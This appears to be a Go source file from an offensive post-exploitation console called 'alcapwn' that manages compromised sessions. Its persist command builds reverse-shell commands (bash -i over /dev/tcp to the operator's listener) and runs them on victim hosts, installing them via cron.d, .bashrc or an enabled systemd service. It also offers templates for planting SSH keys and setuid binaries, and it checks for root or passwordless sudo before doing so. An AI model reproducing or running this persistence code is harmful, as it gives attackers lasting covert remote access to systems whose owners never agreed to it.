package main

import (
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

// cmdLabels manages session labels
// Usage: labels <id> <label1> [label2...] - Add labels to session
//
//	labels <id>                        - Show labels
//	labels <id> remove <label>         - Remove a label
func (c *Console) cmdLabels(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage:")
		fmt.Println("  labels <id> <label1> [label2...]  - Add labels to session")
		fmt.Println("  labels <id>                       - Show labels")
		fmt.Println("  labels <id> remove <label>        - Remove a label")
		return
	}

	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}

	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	// Check for subcommands
	if len(args) >= 2 && args[1] == "remove" {
		if len(args) < 3 {
			fmt.Println("[!] Usage: labels <id> remove <label>")
			return
		}
		labelToRemove := args[2]
		c.persistMu.Lock()
		if session, exists := c.persist.Sessions[id]; exists {
			newLabels := make([]string, 0)
			for _, l := range session.Labels {
				if l != labelToRemove {
					newLabels = append(newLabels, l)
				}
			}
			session.Labels = newLabels
			c.persist.Sessions[id] = session
		}
		err := c.persist.Save()
		c.persistMu.Unlock()
		if err != nil {
			fmt.Printf("[!] Failed to save: %v\n", err)
			return
		}
		fmt.Printf("[*] Label '%s' removed from session %d\n", labelToRemove, id)
		return
	}

	// If no additional args, show labels
	if len(args) == 1 {
		c.persistMu.Lock()
		if session, exists := c.persist.Sessions[id]; exists {
			fmt.Printf("[*] Labels for session %d:\n", id)
			if len(session.Labels) == 0 {
				fmt.Println("  (no labels)")
			} else {
				for _, l := range session.Labels {
					fmt.Printf("  - %s\n", l)
				}
			}
		} else {
			fmt.Printf("[*] Session %d not in persistence store\n", id)
		}
		c.persistMu.Unlock()
		return
	}

	// Add labels
	labels := args[1:]
	c.persistMu.Lock()
	if session, exists := c.persist.Sessions[id]; exists {
		// Combine existing labels with new ones (avoid duplicates)
		existing := make(map[string]bool)
		for _, l := range session.Labels {
			existing[l] = true
		}
		for _, l := range labels {
			if !existing[l] {
				session.Labels = append(session.Labels, l)
			}
		}
		c.persist.Sessions[id] = session
	} else {
		// Create new session metadata if not exists
		session := SessionMetadata{
			ID:         id,
			Labels:     labels,
			Persistent: false,
			LastSeen:   time.Now().Format(time.RFC3339),
		}
		c.persist.Sessions[id] = session
	}
	err = c.persist.Save()
	c.persistMu.Unlock()
	if err != nil {
		fmt.Printf("[!] Failed to save: %v\n", err)
		return
	}

	fmt.Printf("[*] Labels added to session %d: %s\n", id, strings.Join(labels, ", "))
}

// cmdNotes manages session notes
// Usage: notes <id> <note>      - Set/append notes to session
//
//	notes <id>             - Show notes
//	notes <id> clear       - Clear notes
func (c *Console) cmdNotes(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage:")
		fmt.Println("  notes <id> <note>   - Set/append notes to session")
		fmt.Println("  notes <id>          - Show notes")
		fmt.Println("  notes <id> clear    - Clear notes")
		return
	}

	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}

	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	// Check for subcommands
	if len(args) >= 2 && args[1] == "clear" {
		c.persistMu.Lock()
		if session, exists := c.persist.Sessions[id]; exists {
			session.Notes = ""
			c.persist.Sessions[id] = session
		}
		err := c.persist.Save()
		c.persistMu.Unlock()
		if err != nil {
			fmt.Printf("[!] Failed to save: %v\n", err)
			return
		}
		fmt.Printf("[*] Notes cleared for session %d\n", id)
		return
	}

	// If no additional args, show notes
	if len(args) == 1 {
		c.persistMu.Lock()
		if session, exists := c.persist.Sessions[id]; exists {
			fmt.Printf("[*] Notes for session %d:\n", id)
			if session.Notes == "" {
				fmt.Println("  (no notes)")
			} else {
				for _, line := range strings.Split(session.Notes, "\n") {
					fmt.Printf("  %s\n", line)
				}
			}
		} else {
			fmt.Printf("[*] Session %d not in persistence store\n", id)
		}
		c.persistMu.Unlock()
		return
	}

	// Append notes
	note := strings.Join(args[1:], " ")
	c.persistMu.Lock()
	if session, exists := c.persist.Sessions[id]; exists {
		if session.Notes != "" {
			session.Notes += "\n" + note
		} else {
			session.Notes = note
		}
		c.persist.Sessions[id] = session
	} else {
		// Create new session metadata if not exists
		session := SessionMetadata{
			ID:         id,
			Notes:      note,
			Persistent: false,
			LastSeen:   time.Now().Format(time.RFC3339),
		}
		c.persist.Sessions[id] = session
	}
	err = c.persist.Save()
	c.persistMu.Unlock()
	if err != nil {
		fmt.Printf("[!] Failed to save: %v\n", err)
		return
	}

	fmt.Printf("[*] Note added to session %d\n", id)
}

// cmdPersist installs or manages persistence on a session.
// Usage: persist <id> <profile_id>  - Install persistence using profile
//
//	persist create <name> <method> - Create a new persistence profile
//	persist list               - List all persistence profiles
//	persist list <id>          - List persistence for a session
//	persist remove <profile_id> - Remove a persistence profile
//	persist assign <profile_id> <id> - Assign profile to session
//	persist unassign <profile_id> <id> - Remove session from profile
//
// Methods: cron, bashrc, sshkey, systemd, setuid
func (c *Console) cmdPersist(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage:")
		fmt.Println("  persist create <name> <method>      - Create a new persistence profile")
		fmt.Println("  persist <id> <profile_id>           - Assign profile to session")
		fmt.Println("  persist list                        - List all persistence profiles")
		fmt.Println("  persist list <id>                   - List persistence for a session")
		fmt.Println("  persist remove <profile_id>         - Remove a persistence profile")
		fmt.Println("  persist assign <profile_id> <id>    - Assign profile to session")
		fmt.Println("  persist unassign <profile_id> <id>  - Remove session from profile")
		fmt.Println("Methods: cron, bashrc, sshkey, systemd, setuid")
		return
	}

	subCmd := args[0]

	// Handle subcommands
	if subCmd == "create" {
		c.cmdPersistCreate(args[1:])
		return
	}
	if subCmd == "list" {
		c.cmdPersistList(args[1:])
		return
	}
	if subCmd == "remove" {
		c.cmdPersistRemove(args[1:])
		return
	}
	if subCmd == "assign" {
		c.cmdPersistAssign(args[1:])
		return
	}
	if subCmd == "unassign" {
		c.cmdPersistUnassign(args[1:])
		return
	}

	// Main persistence install command: persist <id> <method>
	id, err := strconv.Atoi(subCmd)
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", subCmd)
		return
	}

	method := ""
	if len(args) > 1 {
		method = strings.ToLower(args[1])
	} else {
		fmt.Println("[!] Usage: persist <id> <method> [profile_name]")
		fmt.Println("Methods: cron, bashrc, sshkey, systemd, setuid")
		return
	}

	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	if sess.State == SessionStateInteractive {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
		return
	}
	if sess.State == SessionStateTerminated {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d has been terminated.\n", id)
		return
	}
	if sess.Upgrader == nil {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
		return
	}
	u := sess.Upgrader
	sess.mu.Unlock()

	// Get listener address from session and parse host/port
	listenerAddr := sess.ListenerAddr
	if listenerAddr == "" {
		listenerAddr = "unknown:0"
	}

	// Parse host:port from listener address
	listenHost := "localhost"
	listenPort := "4444"
	if h, p, err := net.SplitHostPort(listenerAddr); err == nil {
		listenHost = h
		listenPort = p
	}

	var cmd string
	var msg string

	switch method {
	case "cron":
		cmd = fmt.Sprintf(`echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" >> /etc/cron.d/alcapwn`, listenHost, listenPort)
		msg = "Cron persistence installed (runs every 5 minutes)"
	case "bashrc":
		cmd = fmt.Sprintf(`echo "bash -i >& /dev/tcp/%s/%s 0>&1 &" >> ~/.bashrc`, listenHost, listenPort)
		msg = "Bashrc persistence installed (runs on new shell)"
	case "sshkey":
		cmd = `echo "ssh-rsa <PUBKEY> alcapwn" >> ~/.ssh/authorized_keys`
		msg = "SSH key persistence installed (requires manual key setup)"
	case "systemd":
		cmd = fmt.Sprintf(`echo "[Unit]
Description=Alcapwn Persistence
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/alcapwn.service && systemctl enable alcapwn`, listenHost, listenPort)
		msg = "Systemd persistence installed (requires root)"
	case "setuid":
		cmd = `chmod u+s /path/to/binary`
		msg = "SUID bit set (requires SUID binary upload first)"
	default:
		fmt.Println("[!] Unknown method. Use: cron, bashrc, sshkey, systemd, setuid")
		return
	}

	// Check if session is root before allowing root-required persistence methods.
	// Use live IsRoot (updated by exploit engine) first; fall back to recon snapshot.
	sess.mu.Lock()
	isRoot := sess.IsRoot // live state — set by exploit auto or post-recon init
	sudoNopasswd := false
	if !isRoot && sess.Findings != nil {
		// Also accept recon-snapshot root (uid=0 user) as sufficient.
		if sess.Findings.User != nil && *sess.Findings.User == "root" {
			isRoot = true
		}
		if sess.Findings.UID != nil && *sess.Findings.UID == "0" {
			isRoot = true
		}
		for _, entry := range sess.Findings.SudoNopasswd {
			if entry.Command == "ALL" || entry.Command == "/bin/bash" || entry.Command == "/bin/sh" {
				sudoNopasswd = true
			}
		}
	}
	sess.mu.Unlock()

	// Root-required methods need either root access or sudo nopasswd
	rootRequiredMethods := map[string]bool{
		"systemd": true,
		"setuid":  true,
	}
	if rootRequiredMethods[method] && !isRoot && !sudoNopasswd {
		fmt.Printf("[!] Method '%s' requires root or sudo nopasswd access\n", method)
		fmt.Println("[!] Current session does not have sufficient privileges")
		fmt.Println("[!] Try using 'bashrc' or 'cron' (if writing to user crontab) instead")
		return
	}

	// Get OS from session metadata or use "unknown"
	osName := "unknown"
	if sess.Findings != nil && sess.Findings.OS != nil {
		osName = *sess.Findings.OS
	}

	// Generate profile name
	profileName := fmt.Sprintf("%s_%s_%d", osName, method, id)

	c.persistMu.Lock()
	// Create a new persistence profile
	profile := PersistenceProfile{
		ID:        fmt.Sprintf("profile_%d", c.persist.NextProfileID),
		Name:      profileName,
		Method:    method,
		Sessions:  []int{id},
		Listener:  listenerAddr,
		Enabled:   true,
		CreatedAt: time.Now().Format(time.RFC3339),
		Details:   cmd,
	}
	c.persist.Profiles[profile.ID] = profile
	c.persist.NextProfileID++

	// Upsert session metadata — create it if recon hasn't run yet.
	// We need IP, Listener, Name, and Persistent stored so reconnects are
	// detected and auto-labelled by acceptLoop.
	sess.mu.Lock()
	sessLabel := sess.Label
	sess.mu.Unlock()
	srcIP := sess.remoteHost()
	meta := c.persist.Sessions[id] // zero value if not present
	meta.ID = id
	meta.Persistent = true
	meta.Name = sessLabel
	meta.IP = srcIP
	meta.Listener = listenerAddr
	if meta.LastSeen == "" {
		meta.LastSeen = time.Now().Format(time.RFC3339)
	}
	c.persist.Sessions[id] = meta

	err = c.persist.Save()
	c.persistMu.Unlock()
	if err != nil {
		fmt.Printf("[!] Failed to save persistence profile: %v\n", err)
		return
	}

	fmt.Printf("[*] Persistence profile '%s' created: %s\n", profile.Name, profile.ID)
	fmt.Printf("[*] Profile assigned to session %d\n", id)
	if sessLabel == "" {
		fmt.Printf("[i] Session %d has no name — reconnects will open as a normal numbered session.\n", id)
		fmt.Printf("    Run 'rename %d <name>' then re-run this command to enable auto-naming on reconnect.\n", id)
	} else {
		fmt.Printf("[*] Reconnects from %s will be auto-labelled '%s'.\n", sess.RemoteAddr, sessLabel)
	}

	// sshkey and setuid are template-only methods that require manual setup
	// (placeholder public key and binary path can't be executed as-is).
	if method == "sshkey" || method == "setuid" {
		fmt.Printf("[*] Template command (manual setup required):\n  %s\n", cmd)
		fmt.Printf("[*] %s\n", msg)
		return
	}

	// Execute the persistence command on the remote session.
	fmt.Printf("[*] Executing on session %d...\n", id)
	if err := u.write(cmd + "\n"); err != nil {
		fmt.Printf("[!] Failed to send persistence command: %v\n", err)
		return
	}

	output, err := u.readUntilPrompt(10 * time.Second)
	if err != nil {
		fmt.Printf("[!] Failed to read persistence output: %v\n", err)
		return
	}

	clean := u.StripPrompts(output)
	lines := strings.Split(clean, "\n")
	if len(lines) > 0 && strings.TrimSpace(lines[0]) == strings.TrimSpace(cmd) {
		lines = lines[1:]
	}
	clean = strings.TrimRight(strings.Join(lines, "\n"), "\t ")
	if clean != "" {
		fmt.Println(clean)
	}
	fmt.Printf("[+] %s\n", msg)
}

// cmdPersistCreate creates a new persistence profile without assigning to a session
func (c *Console) cmdPersistCreate(args []string) {
	if len(args) < 2 {
		fmt.Println("[!] Usage: persist create <name> <method>")
		fmt.Println("Methods: cron, bashrc, sshkey, systemd, setuid")
		return
	}

	name := args[0]
	method := strings.ToLower(args[1])

	var cmd string
	var msg string
	var placeholderHost string
	var placeholderPort string

	switch method {
	case "cron":
		cmd = `echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/HOST/PORT 0>&1'" >> /etc/cron.d/alcapwn`
		msg = "Cron persistence installed (runs every 5 minutes)"
		placeholderHost = "YOUR_LISTENER_IP"
		placeholderPort = "YOUR_LISTENER_PORT"
	case "bashrc":
		cmd = `echo "bash -i >& /dev/tcp/HOST/PORT 0>&1 &" >> ~/.bashrc`
		msg = "Bashrc persistence installed (runs on new shell)"
		placeholderHost = "YOUR_LISTENER_IP"
		placeholderPort = "YOUR_LISTENER_PORT"
	case "sshkey":
		cmd = `echo "ssh-rsa <PUBKEY> alcapwn" >> ~/.ssh/authorized_keys`
		msg = "SSH key persistence installed (requires manual key setup)"
		placeholderHost = "N/A"
		placeholderPort = "N/A"
	case "systemd":
		cmd = `echo "[Unit]
Description=Alcapwn Persistence
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/HOST/PORT 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/alcapwn.service && systemctl enable alcapwn`
		msg = "Systemd persistence installed (requires root)"
		placeholderHost = "YOUR_LISTENER_IP"
		placeholderPort = "YOUR_LISTENER_PORT"
	case "setuid":
		cmd = `chmod u+s /path/to/binary`
		msg = "SUID bit set (requires SUID binary upload first)"
		placeholderHost = "N/A"
		placeholderPort = "N/A"
	default:
		fmt.Println("[!] Unknown method. Use: cron, bashrc, sshkey, systemd, setuid")
		return
	}

	c.persistMu.Lock()
	profile := PersistenceProfile{
		ID:        fmt.Sprintf("profile_%d", c.persist.NextProfileID),
		Name:      name,
		Method:    method,
		Sessions:  []int{},
		Listener:  "",
		Enabled:   true,
		CreatedAt: time.Now().Format(time.RFC3339),
		Details:   cmd,
	}
	c.persist.Profiles[profile.ID] = profile
	c.persist.NextProfileID++
	err := c.persist.Save()
	c.persistMu.Unlock()
	if err != nil {
		fmt.Printf("[!] Failed to save persistence profile: %v\n", err)
		return
	}

	fmt.Printf("[*] Persistence profile '%s' created: %s\n", name, profile.ID)
	fmt.Printf("[*] Command template:\n  %s\n", cmd)
	fmt.Printf("[*] %s\n", msg)
	fmt.Printf("[*] Replace HOST with %s and PORT with %s\n", placeholderHost, placeholderPort)
	fmt.Println("[*] Note: Use 'persist assign' to add sessions to this profile")
}

// cmdPersistList lists persistence profiles or sessions
func (c *Console) cmdPersistList(args []string) {
	if len(args) == 0 {
		// List all profiles
		c.persistMu.Lock()
		if len(c.persist.Profiles) == 0 {
			fmt.Println("[*] No persistence profiles created")
			c.persistMu.Unlock()
			return
		}

		fmt.Println("[*] Persistence profiles:")
		fmt.Printf("  %-12s  %-8s  %-20s  %s\n", "ID", "Method", "Name", "Sessions")
		fmt.Printf("  %-12s  %-8s  %-20s  %s\n", strings.Repeat("-", 12), strings.Repeat("-", 8), strings.Repeat("-", 20), strings.Repeat("-", 30))
		for _, profile := range c.persist.Profiles {
			sessCount := len(profile.Sessions)
			fmt.Printf("  %-12s  %-8s  %-20s  %d session(s)\n", profile.ID, profile.Method, profile.Name, sessCount)
		}
		c.persistMu.Unlock()
		return
	}

	// List persistence for a specific session
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}

	c.persistMu.Lock()
	if session, exists := c.persist.Sessions[id]; exists {
		fmt.Printf("[*] Persistence info for session %d:\n", id)
		fmt.Printf("  Persistent: %v\n", session.Persistent)
		fmt.Printf("  Last Seen:  %s\n", session.LastSeen)
	} else {
		fmt.Printf("[*] Session %d not in persistence store\n", id)
	}
	c.persistMu.Unlock()
}

// cmdPersistAssign assigns a persistence profile to a session
func (c *Console) cmdPersistAssign(args []string) {
	if len(args) < 2 {
		fmt.Println("[!] Usage: persist assign <profile_id> <session_id>")
		return
	}

	profileID := args[0]
	id, err := strconv.Atoi(args[1])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[1])
		return
	}

	c.persistMu.Lock()
	defer c.persistMu.Unlock()

	profile, exists := c.persist.Profiles[profileID]
	if !exists {
		fmt.Printf("[!] Profile %s not found\n", profileID)
		return
	}

	// Check if session is already in profile
	for _, sessID := range profile.Sessions {
		if sessID == id {
			fmt.Printf("[!] Session %d is already assigned to profile %s\n", id, profileID)
			return
		}
	}

	// Add session to profile
	profile.Sessions = append(profile.Sessions, id)
	c.persist.Profiles[profileID] = profile

	// Update session metadata
	if session, exists := c.persist.Sessions[id]; exists {
		session.Persistent = true
		c.persist.Sessions[id] = session
	}

	if err := c.persist.Save(); err != nil {
		fmt.Printf("[!] Failed to save persistence profile: %v\n", err)
		return
	}

	fmt.Printf("[*] Session %d assigned to profile %s (%s)\n", id, profile.Name, profileID)
}

// cmdPersistUnassign removes a session from a persistence profile
func (c *Console) cmdPersistUnassign(args []string) {
	if len(args) < 2 {
		fmt.Println("[!] Usage: persist unassign <profile_id> <session_id>")
		return
	}

	profileID := args[0]
	id, err := strconv.Atoi(args[1])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[1])
		return
	}

	c.persistMu.Lock()
	defer c.persistMu.Unlock()

	profile, exists := c.persist.Profiles[profileID]
	if !exists {
		fmt.Printf("[!] Profile %s not found\n", profileID)
		return
	}

	// Find and remove the session
	newSessions := make([]int, 0)
	found := false
	for _, sessID := range profile.Sessions {
		if sessID == id {
			found = true
		} else {
			newSessions = append(newSessions, sessID)
		}
	}

	if !found {
		fmt.Printf("[!] Session %d not found in profile %s\n", id, profileID)
		return
	}

	profile.Sessions = newSessions
	c.persist.Profiles[profileID] = profile

	// Update session metadata - check if any other profiles have this session
	usesOtherProfile := false
	for _, p := range c.persist.Profiles {
		if p.ID != profileID {
			for _, sessID := range p.Sessions {
				if sessID == id {
					usesOtherProfile = true
					break
				}
			}
		}
		if usesOtherProfile {
			break
		}
	}

	if session, exists := c.persist.Sessions[id]; exists {
		session.Persistent = usesOtherProfile
		c.persist.Sessions[id] = session
	}

	if err := c.persist.Save(); err != nil {
		fmt.Printf("[!] Failed to save persistence profile: %v\n", err)
		return
	}

	fmt.Printf("[*] Session %d removed from profile %s (%s)\n", id, profile.Name, profileID)
}

// cmdPersistRemove removes a persistence profile
func (c *Console) cmdPersistRemove(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: persist remove <profile_id>")
		return
	}

	profileID := args[0]

	c.persistMu.Lock()
	defer c.persistMu.Unlock()

	profile, exists := c.persist.Profiles[profileID]
	if !exists {
		fmt.Printf("[!] Profile %s not found\n", profileID)
		return
	}

	// Remove the profile
	delete(c.persist.Profiles, profileID)

	// Update session metadata for all sessions in this profile
	for _, sessID := range profile.Sessions {
		if session, exists := c.persist.Sessions[sessID]; exists {
			// Check if session is in any other profile
			usesOtherProfile := false
			for _, p := range c.persist.Profiles {
				for _, sid := range p.Sessions {
					if sid == sessID {
						usesOtherProfile = true
						break
					}
				}
				if usesOtherProfile {
					break
				}
			}
			session.Persistent = usesOtherProfile
			c.persist.Sessions[sessID] = session
		}
	}

	if err := c.persist.Save(); err != nil {
		fmt.Printf("[!] Failed to save persistence profile: %v\n", err)
		return
	}

	fmt.Printf("[*] Persistence profile %s (%s) removed\n", profile.Name, profileID)
}

// cmdConfig handles config management
func (c *Console) cmdConfig(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: config <set|show|reset>")
		fmt.Println("  config set <key> <value> - Set config value")
		fmt.Println("  config show              - Show current config")
		fmt.Println("  config reset             - Reset to defaults")
		return
	}

	subcmd := args[0]

	switch subcmd {
	case "set":
		if len(args) < 3 {
			fmt.Println("[!] Usage: config set <key> <value>")
			return
		}
		key := args[1]
		value := args[2]

		switch key {
		case "auto_open_listeners":
			if value == "true" {
				c.config.AutoOpenListeners = true
			} else if value == "false" {
				c.config.AutoOpenListeners = false
			} else {
				fmt.Println("[!] Value must be 'true' or 'false'")
				return
			}
		default:
			fmt.Printf("[!] Unknown config key: %s\n", key)
			return
		}

		if err := c.config.Save(); err != nil {
			fmt.Printf("[!] Failed to save config: %v\n", err)
			return
		}
		fmt.Printf("[*] Config set: %s = %v\n", key, value)

	case "show":
		fmt.Println("[*] Current configuration:")
		fmt.Printf("  auto_open_listeners: %v\n", c.config.AutoOpenListeners)
		fmt.Printf("  findings_dir: %s\n", c.config.FindingsDir)
		fmt.Printf("  max_reconnect_attempts: %d\n", c.config.MaxReconnectAttempts)
		fmt.Printf("  reconnect_timeout: %d\n", c.config.ReconnectTimeout)

	case "reset":
		c.config = &Config{AutoOpenListeners: true}
		if err := c.config.Save(); err != nil {
			fmt.Printf("[!] Failed to save config: %v\n", err)
			return
		}
		fmt.Println("[*] Config reset to defaults")

	default:
		fmt.Println("[!] Usage: config <set|show|reset>")
	}
}

// LoadConfig loads the config from ~/.alcapwn/config.json
func (c *Console) LoadConfig() {
	c.configMu.Lock()
	defer c.configMu.Unlock()
	if err := c.config.Load(); err != nil {
		fmt.Printf("[!] Warning: Failed to load config: %v\n", err)
	}
}

// SaveConfig saves the config to ~/.alcapwn/config.json
func (c *Console) SaveConfig() {
	c.configMu.Lock()
	defer c.configMu.Unlock()
	if err := c.config.Save(); err != nil {
		fmt.Printf("[!] Warning: Failed to save config: %v\n", err)
	}
}

// LoadPersistence loads the persistence store from ~/.alcapwn/persistence.json
func (c *Console) LoadPersistence() {
	c.persistMu.Lock()
	defer c.persistMu.Unlock()
	if err := c.persist.Load(); err != nil {
		fmt.Printf("[!] Warning: Failed to load persistence: %v\n", err)
	}
}

// SavePersistence saves the persistence store to ~/.alcapwn/persistence.json
func (c *Console) SavePersistence() {
	c.persistMu.Lock()
	defer c.persistMu.Unlock()
	if err := c.persist.Save(); err != nil {
		fmt.Printf("[!] Warning: Failed to save persistence: %v\n", err)
	}
}

// LoadFirewalls loads the firewall store from ~/.alcapwn/firewalls.json
func (c *Console) LoadFirewalls() {
	c.firewallMu.Lock()
	defer c.firewallMu.Unlock()
	if err := c.firewalls.Load(); err != nil {
		fmt.Printf("[!] Warning: Failed to load firewalls: %v\n", err)
	}
}

// SaveFirewalls saves the firewall store to ~/.alcapwn/firewalls.json
func (c *Console) SaveFirewalls() {
	c.firewallMu.Lock()
	defer c.firewallMu.Unlock()
	if err := c.firewalls.Save(); err != nil {
		fmt.Printf("[!] Warning: Failed to save firewalls: %v\n", err)
	}
}
